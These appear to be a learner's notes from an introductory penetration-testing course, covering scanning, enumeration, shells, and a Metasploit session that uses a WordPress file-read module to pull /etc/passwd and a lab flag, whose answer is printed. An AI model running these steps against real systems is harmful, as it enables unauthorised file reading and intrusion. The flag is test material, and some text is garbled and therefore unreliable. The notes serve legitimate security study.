

## Task-1 Common terms

Shell is a program that listens to user inputs and passes these commands to Operating Systems to perform specific functions.

In early days Shell used to be only interface available to interact with systems until other programs and GUI came out.

Most Linux systems use a program called [Bash (Bourne Again Shell)](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html) as a shell program to interact with the operating system. Bash is an enhanced version of [sh](https://man7.org/linux/man-pages/man1/sh.1p.html), the Unix systems' original shell program. Aside from `bash` there are also other shells, including but not limited to [Zsh](https://en.wikipedia.org/wiki/Z_shell), [Tcsh](https://en.wikipedia.org/wiki/Tcsh), [Ksh](https://en.wikipedia.org/wiki/KornShell), [Fish shell](https://en.wikipedia.org/wiki/Fish_\(Unix_shell\)), etc.

A shell maybe obtained by exploiting a web application or network/service vulnerability or obtaining credentials and logging into the target host remotely.

| **Shell Type**  | **Description**                                                                                                                                                                                                                                   |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Reverse shell` | Initiates a connection back to a "listener" on our attack box.                                                                                                                                                                                    |
| `Bind shell`    | "Binds" to a specific port on the target host and waits for a connection from our attack box.                                                                                                                                                     |
| `Web shell`     | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command. |

---

### What is a Port?

A port are virtual points where network connection begin and end.They are software-based and managed by host operating system.Ports are associated with a specific process or service and allow computers to differentiate between different traffic types.

Port help computers understand how to handle various types of data they receive.

Each port has an assigned number and many are standardised across all network connected devices For example, `HTTP` messages (website traffic) typically go to port `80`, while `HTTPS` messages go to port `443` unless configured otherwise. We will encounter web applications running on non-standard ports but typically find them on ports 80 and 443. Port numbers allow us to access specific services or applications running on target device.

There are two categories of ports, [Transmission Control Protocol (TCP)](https://en.wikipedia.org/wiki/Transmission_Control_Protocol), and [User Datagram Protocol (UDP)](https://en.wikipedia.org/wiki/User_Datagram_Protocol).  

- `TCP` is connection-oriented, meaning that a connection between a client and a server must be established before data can be sent. The server must be in a listening state awaiting connection requests from clients.  

- `UDP` utilizes a connectionless communication model. There is no "handshake" and therefore introduces a certain amount of unreliability since there is no guarantee of data delivery. 

`UDP` is useful when error correction/checking is either not needed or is handled by the application itself. `UDP` is suitable for applications that run time-sensitive tasks since dropping packets is faster than waiting for delayed packets due to retransmission, as is the case with `TCP` and can significantly affect a real-time system. There are `65,535` `TCP` ports and `65,535` different `UDP` ports, each denoted by a number. Some of the most well-known `TCP` and `UDP` ports are listed below:

| **Port(s)**    | **Protocol**                                 |
| -------------- | -------------------------------------------- |
| 20/21 (TCP)    | FTP (File Transfer Protocol)                 |
| 22 (TCP)       | SSH (Secure Shell)                           |
| 23 (TCP)       | Telnet                                       |
| 25 (TCP)       | SMTP (Simple Mail Transfer Protocol)         |
| 53 (TCP/UDP)   | DNS (Domain Name System)                     |
| 67/68 (UDP)    | DHCP (Dynamic Host Configuration Protocol)   |
| 69 (UDP)       | TFTP (Trivial File Transfer Protocol)        |
| 80 (TCP)       | HTTP (Hypertext Transfer Protocol)           |
| 88(TCP/UDP)    | Kerberos                                     |
| 110 (TCP)      | POP3 (Post Office Protocol v3)               |
| 123 (UDP)      | NTP (Network Time Protocol)                  |
| 143 (TCP)      | IMAP (Internet Message Access Protocol)      |
| 161 (TCP/UDP)  | SNMP (Simple Network Management Protocol)    |
| 389 (TCP/UDP)  | LDAP (Lightweight Directory Access Protocol) |
| 443 (TCP)      | SSL/TLS (HTTPS)                              |
| 445 (TCP)      | SMB (Server Message Block)                   |
| 465 (TCP)      | SMTPS (SMTP Secure)                          |
| 514 (UDP)      | Syslog                                       |
| 636 (TCP)      | LDAPS (LDAP Secure)                          |
| 989/990 (TCP)  | FTPS (FTP Secure)                            |
| 1433 (TCP)     | MSSQL (Microsoft SQL Server)                 |
| 1521 (TCP)     | Oracle Database                              |
| 2049 (TCP/UDP) | NFS (Network File System)                    |
| 3306 (TCP)     | MySQL Database                               |
| 3389 (TCP)     | RDP (Remote Desktop Protocol)                |
| 5432 (TCP)     | PostgreSQL                                   |
| 5900 (TCP)     | VNC (Virtual Network Computing)              |
| 6379 (TCP)     | Redis                                        |
| 8080 (TCP)     | HTTP Alternate (Common Proxy Port)           |

This is a great [reference](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/) on the top 1,000 `TCP` and `UDP` ports from `nmap` along with the top 100 services scanned by `nmap`.


---

### What is a Web Server?

A web server is an application that runs on back-end server which handles HTTP traffic from client side browser, routes it to requests destination pages and finally responds to client-side browser. Web Servers are commonly found to be running on port `80` and `443` and are responsible for connecting end-users to various parts of web application,in addition to handling their various response.


Web Applications are tend to become an open attack surface making them a high-value target for attackers and pentesters since they are open for public interaction and may lead to back-end server being compromised if they happen to have vulnerabilities.

Many types of vulnerabilities can affect web applications. We will often hear about/see references to the [OWASP Top 10](https://owasp.org/www-project-top-ten/). This is a standardized list of the top 10 web application vulnerabilities maintained by the Open Web Application Security Project (OWASP). This list is considered the top 10 most dangerous vulnerabilities and is not an exhaustive list of all possible web application vulnerabilities. Web application security assessment methodologies are often based around the OWASP top 10 as a starting point for the top categories of flaws that an assessor should be checking for. The current OWASP Top 10 list is:

| Number | Category                                                                                                                   | Description                                                                                                                                                                                                                                                                                                               |
| ------ | -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1.     | [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)                                           | Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.                                                                                                                                   |
| 2.     | [Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)                                         | Failures related to cryptography which often leads to sensitive data exposure or system compromise.                                                                                                                                                                                                                       |
| 3.     | [Injection](https://owasp.org/Top10/A03_2021-Injection/)                                                                   | User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc.                                                                                                                                                    |
| 4.     | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)                                                       | These issues happen when the application is not designed with security in mind.                                                                                                                                                                                                                                           |
| 5.     | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)                                   | Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.                                                                                                                         |
| 6.     | [Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)                 | Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.                                                                                                                                                                                                                     |
| 7.     | [Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) | Authentication-related attacks that target user's identity, authentication, and session management.                                                                                                                                                                                                                       |
| 8.     | [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)             | Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).                              |
| 9.     | [Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)     | This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..                                                                                                                                                                                  |
| 10.    | [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)                    | SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL). |

---

## Task -2 Basic Tools

In this task we will learn about tools like ssh, Netcat. Tmux and vim


### Secure Shell (SSH)

Secure Shell is a cryptographic network protocol that runs on port 22 by default and provides users such as SysAdmins a secure way to access computers remotely. SSH can be configured either will password authentication or password-less using public key authentiation using an SSH public/private Key pair. SSH can be used to remotely access systems on the network, over the internet , facilitate connections to resources in other networks using port forwarding/Proxying and upload/download files to and from remote systems.

SSH uses client/server model, connecting a user running any SSH client operation such as `OpenSSH` to an SSH server. While attacking a box or during a real-world assessment, we can often ob10.129.5.77tain clear text credentials or an SSH private key that can be leveraged to connect directly to system via SSH. An SSH connection is more stable compared to reverse shell and can often be used as "Jump Host" to enumerate and attack other hosts in network,transfer tools, setup persistence, etc.

A Basic syntax and working of SSH
```Bash
0xWAYNE@htb[/htb]$ ssh Bob@10.10.10.10

Bob@remotehost's password: *********

Bob@remotehost#
```

It is also possible to read local private keys on a compromised system or add our public key to gain SSH access to specific user.We can deduce, SSH is an excellent tool for securely connecting to a remote machine. It also provides a way for mapping local ports on the remote machine to our localhost, which can become handy at times.

---

### Netcat (ncat/nc)

Netcat, Ncat or nc is network utility for interacting with TCP/UDP ports. It can be used for many things during a pentest. Its primary usage is for connecting to shells. In addition, netcat can be used to connect to any listening port and interact with service running on that port. For example, SSH is programmed to handle connections over port 22 to send all data and keys. We can connect to TCP port 22 with netcat.

```Bash
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Modules]
└─$ netcat 83.136.251.68 45449                           
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
```

As we can see, Port 22 (SSH) sent us its banner,stating SSH is running on it. This technique is known as Banner Grabbing and can help in identify the service running on particular port. Netcat comes pre-installed in most linux distros. In windows an alternative for netcat is coded in powershell called `PowerCat`. Netcat can be used to transfer files between machines.

Another similar utility is `socat` which has additional features compared to netcat like forwarding ports and connecting to serial devices. Socat can also be used to [upgrade a shell to  interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat). Socat is handy utility that must be part of pentester's toolkit. A [standalone binaries](https://github.com/andrew-d/static-binaries) of Socat can be transferred to a system after obtaining remote code execution to get more stable reverse shell connection.

----
### Tmux

Terminal multiplexers like tmux or screen are handy utilities for expanding a standard linux terminal's features like having multiple windows within one terminal and jumping between them.

This [cheatsheet](https://tmuxcheatsheet.com/) is a very handy reference. Also, this [Introduction to tmux](https://www.youtube.com/watch?v=Lqehvpe_djs) video by `ippsec` is worth your time.

---

### Vim

Vim is best text editor that can be used for writing code or editing text files on linux systems. One of great benefits of using `Vim` is it entirely relies on keyboard.

If we want to create a new file, input the new file name, and `Vim` will open a new window with that file. Once we open a file, we are in read-only `normal mode`, which allows us to navigate and read the file. To edit the file, we hit `i` to enter `insert mode`, shown by the "`-- INSERT --`" at the bottom of `Vim`. Afterward, we can move the text cursor and edit the file:

Once we are finished editing a file, we can hit the escape key `esc` to get out of `insert mode`, back into `normal mode`. When we are in `normal mode`, we can use the following keys to perform some useful shortcuts:

|Command|Description|
|---|---|
|`x`|Cut character|
|`dw`|Cut word|
|`dd`|Cut full line|
|`yw`|Copy word|
|`yy`|Copy full line|
|`p`|Paste|

<mark style="background: #BBFABBA6;">Tip: We can multiply any command to run multiple times by adding a number before it. For example, '4yw' would copy 4 words instead of one, and so on.</mark>

If we want to save a file or quit `Vim`, we have to press`:` to go into `command mode`. Once we do, we will see any commands we type at the bottom of the vim window
There are many commands available to us. The following are some of them:

|Command|Description|
|---|---|
|`:1`|Go to line number 1.|
|`:w`|Write the file, save|
|`:q`|Quit|
|`:q!`|Quit without saving|
|`:wq`|Write and quit|

`Vim` is a very powerful tool and has many other commands and features. This [cheatsheet](https://vimsheet.com/) is an excellent resource for further unlocking the power of `Vim`.

---
## Task -3  Service Scanning

A service is an application running on computer that performs useful functions for other user or computers. A machine that host these services are referred as "Servers" instead of workstations allowing users to  interact with and consume these various services.

Computers are assigned an IP address which allows them to be uniquely identified and accesiible on a network. The services running on this device maybe assigned a port number ranging from 1 to 65,535 with range of know ports from 1 to 1023 being reserved for privileged services. 

<mark style="background: #BBFABBA6;">Port 0 is reserved in TCP/IP networking and not used in TCP or UDP messages. If anything attempts to bind to port 0 , it will bind to next available port above 1024. Because port 0 is known as "Wild Card" port.</mark>

---
#### Nmap

Nmap is a network scanning utility that helps pentesters to identify what ports are active in a system, what services are running on it. Nmap scans the 1,000 most common ports by default.

Under the "PORT" heading, it tells about the ports. By default, NMAP will conduct a TCP Scan unless specifically requested to perform a UDP scan.

The `State` heading confirms that these ports are open.Sometimes we will see other ports listed that have a different state, such as "Filtered". This can happen if a firewall is only allowing access to ports from specific addresses.

The `Service` heading tells us service's name is typically mapped to specific port number. However, the default scan will not tell us what is listening port.

The `-Sc` parameter to specify that `nmap` scripts should be used to try and obtain more detailed information. The `-Sv` parameter instructs `Nmap` to perform a version scan. In this, Nmap will fingerprint services on target system and identify the service protocol, application name and version. The version scan is underpinned by a comprehensive database of over 1,000 service signatures. Finally, -p- tells Nmap that we want to scan all 65,535 TCP ports.


These commands return a lot of information. Since we know it longer to scan all 65.535 ports than standard 1000 ports and there is also a `version` section which tells service version and operating system if possible to identify.

However, cross referencing this data is not entirely reliable, since it is possible to install latest packages into older OS. The `-Sc` causes the Nmap to identify the server headers `http-server-header` page and page title `http-title` for any web page hosted on webserver. The web page title `PHP 7.4.3 - phpinfo()` indicates this is PHPInfo file, which is often manually created to confirm PHP has been successfully installed.


---
#### Nmap Scripts

Specifying `-Sc` will run many useful default scripts against a target. However on a full scale assessment there are cases where running a specific script is required.For Example : If you need to perform audit on Citrix for severe Citrix NetServer Vulnerabilty(CVE-2019-19781) while `NMap` also has other scripts to audit a Citrix installation.

```Bash
┌──(dkvv㉿OMEN)-[~]
└─$ locate scripts/citrix            
/usr/share/nmap/scripts/citrix-brute-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps.nse
/usr/share/nmap/scripts/citrix-enum-servers-xml.nse
/usr/share/nmap/scripts/citrix-enum-servers.nse
```

The basic syntax for Nmap is 

```Bash
Nmap --script <script name> -p<port> <host>
```

Nmap scripts while takes long time to come through with results are great way to enhance scan's functionality and inspection of available options.

---

#### Attacking Network Services

##### Banner Grabbing

Banner grabbing is a useful technique to fingerprint a service quickly. Often a service will look to identify by displaying a banner once a connection established. Nmap will attempt to grab banners if syntax is  `nmap -sV --script=banner <target>` is specified. 

We can attempt it manually by using `Netcat`

```Bash
```shell-session
0xWAYNE@htb[/htb]$ nc -nv 10.129.42.253 21

(UNKNOWN) [10.129.42.253] 21 (ftp) open
220 (vsFTPd 3.0.3)
```

This reveals that the version of `vsFTPd` on the server is `3.0.3`. We can also automate this process using `Nmap's` powerful scripting engine: `nmap -sV --script=banner -p21 10.10.10.0/24`.

##### FTP

FTP is a standard file transfer protocol and this service contains interesting data. An Nmap scan of default port 21 reveals version vsftpd 3.0.3 installation. Furthermore, it also reports that anonymous authentication is enabled that a `pub` directory is avialable.

##### SMB

Server Message Block is a prevalent protocol on Windows machines that provides many vectors for vertical and later movement. Sensitive data can be in network file shares and some SMB versions may be vulnerable to RCE exploits such as `EternalBlue`. Nmap has many scripts for enumerating SMB such as `smb-os-discovery.nse` which will interact with SMB service to extract the reported OS version.

##### Shares

SMB allows users and administrators to share folders and make them accesible remotely by other users. Often these shares have files containing sensitive info such as passwords. A tool that can enumerate  and interact with SMB shares is `smbclient`. The `-L` flag specifies that we want to retreive a list of available shares.

##### SNMP
Simple Network Management Protocol(SNMP) strings provide info and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string and if we know the name we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much info can be gained from SNMP. examination of process parameters might reveal credentials passed on command line, whihc might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing info, services bound to additional interfaces and version of installed software can be revealed.

A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

---

## Task-4 Web Enumeration

When performing service scanning, we will often run into web servers running on ports 80 and 443. Webservers host web applications(more than 1 in some instances) which often provide a considerable attack surface and a very high-value target during a pentest. Proper web enumeration is critical, especially when an organisation is not exposing many services or those services are appropriately patched.

---
#### GoBuster

After discovering a web application it is always worth checking if we can uncover any hidden files or directories on the webserver that are not intended for public access. We can use tool such as `ffuf` or `GoBuster` to perform this directory enum. Sometimes we find hidden functionality or pages/directories exposing sensitive data that can be leveraged to access web app or even remote code execution on web server itself.

#### Directory/File Enumeration

GoBuster is versatile tool that allows for performing DNS,VHost and directory brute-forcing. The tool has additional functionality, such as enum of public AWS s3 buckets.

|**Code**|**Meaning**|**Use in Pentesting / Security**|
|---|---|---|
|**200**|OK|Request succeeded; resource is accessible.|
|**301**|Moved Permanently|URL has been permanently redirected; useful in recon, redirect tracing.|
|**302**|Found / Moved Temporarily|Temporary redirect; often seen in login redirections.|
|**307**|Temporary Redirect|Like 302, but method (GET/POST) is preserved.|
|**308**|Permanent Redirect|Same as 301 but method is preserved.|
|**400**|Bad Request|Malformed request — common when fuzzing or testing payloads.|
|**401**|Unauthorized|Authentication required — important in auth bypass tests.|
|**403**|Forbidden|Server understood but is refusing — often a target for bypass attempts.|
|**404**|Not Found|Resource doesn't exist — often fuzzed to discover hidden paths.|
|**405**|Method Not Allowed|HTTP method not allowed — useful when testing methods like PUT/DELETE.|
|**408**|Request Timeout|The server timed out waiting for the request.|
|**409**|Conflict|Conflict with the current state of the server.|
|**413**|Payload Too Large|Useful when testing for upload size restrictions.|
|**429**|Too Many Requests|Rate limiting in place — important for brute force awareness.|
|**500**|Internal Server Error|Server-side error — can reveal misconfigurations or bugs.|
|**502**|Bad Gateway|Invalid response from upstream — can happen during DoS or proxy issues.|
|**503**|Service Unavailable|Server temporarily overloaded or down.|
|**504**|Gateway Timeout|Server didn’t respond in time — may hint at back-end delays.|

```Bash
gobuster dir -u <URL> -w </Path/to/Wordlists>
```

#### DNS SubDomain Enumeration

There also  may be essential resources hosted on subdomains. such as admin panels or applications with additional functionality that could be exploited. We can use `GoBuster` to enumerate available subdomains of given domain using `dns` flag to specify DNS mode.

### Web Enumeration Tips



#### Banner Grabbing / Web Server Headers

 Web server headers provide a good picture of what is hosted on a web server. They can reveal the specific application framework in use, the authentication options, and whether the server is missing essential security options or has been misconfigured. We can use `cURL` to retrieve server header information from the command line. `cURL` is another essential addition to our penetration testing toolkit, and familiarity with its many options is encouraged.

```Bash
┌──(dkvv㉿OMEN)-[~]
└─$ curl -IL https://www.inlanefreight.com
HTTP/1.1 200 OK
Date: Sun, 06 Apr 2025 17:34:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/index.php/wp-json/wp/v2/pages/7>; rel="alternate"; type="application/json"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
```

#### Whatweb

We can extract the version of web servers, supporting frameworks, and applications using the command-line tool `whatweb`. This information can help us pinpoint the technologies in use and begin to search for potential vulnerabilities.


#### Certificates

SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use. Browsing to `https://10.10.10.121/` and viewing the certificate reveals the details below, including the email address and company name. These could potentially be used to conduct a phishing attack if this is within the scope of an assessment.

#### Robots.txt

It is common for websites to contain a `robots.txt` file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. In this case, we see that the `robots.txt` file contains two disallowed entries.

![Login form with fields for username and password, and a login button.](https://academy.hackthebox.com/storage/modules/77/academy.png)

#### Source Code

It is also worth checking the source code for any web pages we come across. We can hit `[CTRL + U]` to bring up the source code window in a browser. This example reveals a developer comment containing credentials for a test account, which could be used to log in to the website.

---

## Task-4 Public exploits

Once we perform initial recon on ports identified by `nmap` scan, the first step is to look for public exploits.Public exploits can be found for web applications and other applications running on open ports, like `SSH` or `ftp`.

#### Finding Public Exploits

Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with `exploit` to see if we get any results:

A versatile tool for this purpose is `SearchSploit` which can be used to identify public vulns/exploits for any application.

We can also utilize online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/)


#### Metasploit Primer

The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:

- Running reconnaissance scripts to enumerate remote hosts and compromised targets
- Verification scripts to test the existence of a vulnerability without actually compromising the target
- Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
- Many post-exploitation and pivoting tools

```Bash
msf6 > search simple backup

Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wp_simple_backup_file_read  .                normal  No     WordPress Simple Backup File Read Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read

msf6 > use 0
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                         asics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RHOSTS
RHOSTS => 
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RHOSTS 94.237.61.133
RHOSTS => 94.237.61.133
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RPORTS 56891
[!] Unknown datastore option: RPORTS. Did you mean RPORT?
RPORTS => 56891
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RPORT 56891
RPORT => 56891
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     94.237.61.133    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                         asics/using-metasploit.html
   RPORT      56891            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > check
[-] This module does not support check.
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > run
[+] File saved in: /home/dkvv/.msf4/loot/20250406235217_default_94.237.61.133_simplebackup.tra_860403.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     94.237.61.133    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                         asics/using-metasploit.html
   RPORT      56891            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH /flag.txt
FILEPATH => /flag.txt
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /flag.txt        yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     94.237.61.133    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                         asics/using-metasploit.html
   RPORT      56891            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > run
[+] File saved in: /home/dkvv/.msf4/loot/20250406235646_default_94.237.61.133_simplebackup.tra_966245.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > 

```

As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell. These are basic examples of using `Metasploit` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:

- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

#### Questions
+ 1  Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)

```Bash
┌──(dkvv㉿OMEN)-[~/.msf4/loot]
└─$ cat 20250406235646_default_94.237.61.133_simplebackup.tra_966245.txt 
HTB{my_f1r57_h4ck}    
```

---

## Task-5 Shells

A shell is a program that serves as an interface between the user and the operating system, accepting commands from the user and converting them into actions the kernel can understand.

One way to connect to a compromised system is through network protocols, like `SSH` for Linux or `WinRM` for Windows, which would allow us a remote login to the compromised system. However, unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first, to gain access to these services in the first place.

The other method of accessing a compromised host for control and remote code execution is through shells.

There are 3 types of shell

|Type of Shell|Method of Communication|
|---|---|
|`Reverse Shell`|Connects back to our system and gives us control through a reverse connection.|
|`Bind Shell`|Waits for us to connect to it and gives us control once we do.|
|`Web Shell`|Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.|

#### Reverse Shell

This is most common type of shell, as it is quickest and easiest method to obtain control over a compromised host. Once we identify a vuln with remote code execution in remote host we can start `netcat` listener on our attack machine that listens on specific port. With listener shell active when we run an rev shell command on attacker machine we get reverse shell.

```Bash
nc -lvnp <port no>
```

The flags we are using are the following:

|Flag|Description|
|---|---|
|`-l`|Listen mode, to wait for a connection to connect to us.|
|`-v`|Verbose mode, so that we know when we receive a connection.|
|`-n`|Disable DNS resolution and only connect from/to IPs, to speed up the connection.|
|`-p 1234`|Port number `netcat` is listening on, and the reverse connection should be sent to.|

#### Reverse Shell Command

The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access.The [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.


A `Reverse Shell` is handy when we want to get a quick, reliable connection to our compromised host. However, a `Reverse Shell` can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.


#### Bind Shell

Unlike rev shell, for `Bind` shell we have to connect to the listening port. 

Once the Bind shell command is executed,  it starts listening on a port on remote host and binds the host's shell. We have to connect to that port with `netcat` and we get control through a shell on the system.

#### Bind Shell Command

Once again, we can utilize [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) to find a proper command to start our bind shell.

#### Netcat Connection

Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.

We can use `netcat` to connect to that port and get a connection to the shell:

  Types of Shells

```shell-session
0xWAYNE@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Unlike rev shell, the bind shell lets us connect back to the session with the bind shell command and no need to perform from initial steps but if the system gets rebooted we will lose our access.


#### Upgrading TTY(teletype terminal )

We often get basic shell when we binf to rev or bind shell once connected through netcat.Thee shells have restricted functions like we cannot move the cursor or we cannot navigate up and down to access command history. To be able to do these we need to upgrade the shell to `TTY` which can be achieved by mapping our terminal TTY with remote TTY.

There are multiple ways but we primarily use `python/stty` method. The syntax for this is

```Bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Once the command is executed, we need to background this shell on our local terminal (`Ctrl + Z`  shortcut)  and enter following `stty` command.

```Bash
shell-session
www-data@remotehost$ ^Z

0xWAYNE@htb[/htb]$ stty raw -echo
0xWAYNE@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

The `fg` is to bring our netcat shell to foreground. Once we hit enter again we can get back our shell or input `reset`. Finally, we can have a fully working TTY shell without the restricted functions.

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

```shell-session
0xWAYNE@htb[/htb]$ echo $TERM

xterm-256color
```

```shell-session
0xWAYNE@htb[/htb]$ stty size

67 318
```

The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:

```shell-session
